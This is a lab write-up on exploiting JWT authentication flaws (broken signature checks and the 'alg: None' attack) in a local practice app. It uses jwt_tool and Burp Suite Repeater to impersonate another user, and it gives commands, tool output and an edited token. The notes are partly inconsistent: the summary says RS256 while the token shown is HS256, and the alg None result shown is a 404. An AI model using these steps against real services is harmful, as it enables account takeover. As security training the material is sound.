
---

# 📖 High-Level Summary:

This lab demonstrates the use of **jwt_tool** to analyze and exploit vulnerabilities in JSON Web Tokens (JWTs). The focus is on:

1. **Broken Signature**: The application accepts JWTs without validating their signatures.
2. **Algorithm None Attack**: Changing the algorithm from `RS256` to `None` allows bypassing signature verification.

These vulnerabilities enable attackers to manipulate tokens and impersonate other users by editing token payloads.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**jwt_tool**|A tool for testing and exploiting vulnerabilities in JSON Web Tokens.|Supports pre-defined attack modules with flags like `-M` for modules and `-t` for target URL.|
|**JWT (JSON Web Token)**|A token format containing encoded header, payload, and signature sections.|Used for stateless authentication. Vulnerable if the signature is not validated.|
|**Broken Signature**|A vulnerability where the application does not verify the integrity of a tampered token.|Allows attackers to modify tokens without providing a valid signature.|
|**Algorithm None Attack**|A vulnerability where the application accepts `alg: None` as a valid algorithm in the JWT.|Bypasses signature verification entirely.|
|**Repeater (Burp Suite)**|A Burp Suite tool for sending and modifying HTTP requests to test vulnerabilities.|Used here to send modified JWTs to the target application.|
|**`-t` flag**|Specifies the target URL in **jwt_tool**.|Example: `-t http://localhost/...` specifies the endpoint to analyze.|
|**`-M` flag**|Specifies the module in **jwt_tool**.|Example: `-M at` runs the Attack Playbook module.|

---

# 🎯 Steps and Commands:

### Step 1: Log in to the Dashboard

1. Navigate to:
    
    ```plaintext
    http://localhost:8888/dashboard
    ```
    
2. Observe the `Authorization` header in Burp Suite for the GET request to:
    
    ```plaintext
    /identity/api/v2/user/dashboard
    ```
    
    - **Token Example:**
        
        ```plaintext
        Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWwiOiJHRjDS1zW...randomJWTCharacters
        ```
        

---

### Step 2: Use jwt_tool to Analyze the Token

1. Run the **jwt_tool** command to analyze the token:
    
    ```bash
    jwt_tool -t http://localhost:8888/identity/api/v2/user/dashboard -rh 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWwiOiJHRjDS1zW...randomJWTCharacters' -M at
    ```
    
    - **Flags Used**:
        - `-t`: Specifies the target URL (`http://localhost:8888/identity/api/v2/user/dashboard`).
        - `-rh`: Adds the `Authorization` header with the JWT token.
        - `-M at`: Launches the **Attack Playbook** module.

---

### Step 3: Analyze Scanning Module Output

1. **Prescan Checks Output**:
    
    ```plaintext
    jwttool_a9933eb64cf3e12bf8f5d181ae1c126d Prescan: original token Response Code: 200, 179 bytes
    jwttool_2242aff88714ddae9c009dea44435317 Prescan: Broken signature Response Code: 200, 179 bytes
    jwttool_3b804aaab225b15664aed5bc64c51d1e Exploit: "alg":"None" (-X a) Response Code: 404, 58 bytes
    ```
    
    - **Key Findings**:
        - **Broken Signature**: The application accepts tampered tokens, proving that signature validation is not enforced.
        - **Algorithm None Attack**: Changing the algorithm to `None` bypasses signature verification.

---

### Step 4: Exploitation via Burp Suite Repeater

1. Send the **original GET request** to Repeater:
    
    ```plaintext
    /identity/api/v2/user/dashboard
    ```
    
    - Include the **original JWT** in the Authorization header.
    - **Important:** Always send the original request before modifying the token.
2. Modify the JWT in Repeater:
    
    - Use the **JSON Web Token tab** in Repeater to edit the token:
        
        - Change the algorithm in the header to `"alg": "None"`.
        - Replace the user identifier in the payload with another user’s email.
    - **Example Edited JWT**:
        
```json
        {
          "header": {
            "alg": "None",
            "typ": "JWT"
          },
          "payload": {
            "email": "otheruser@example.com",
            "iat": 1675347297
          }
        }
```
        
3. Send the Modified Request:
    
    - Observe the response, which includes the other user’s information.

---

# ✅ Key Takeaways:

1. **Broken Signature**:
    - The server accepts tampered JWTs, allowing attackers to manipulate tokens.
2. **Algorithm None Attack**:
    - Changing the algorithm to `None` bypasses signature verification, exposing user data.
3. **Practical Exploitation**:
    - Use **jwt_tool** to identify vulnerabilities and **Burp Suite Repeater** to exploit them by crafting custom JWTs.
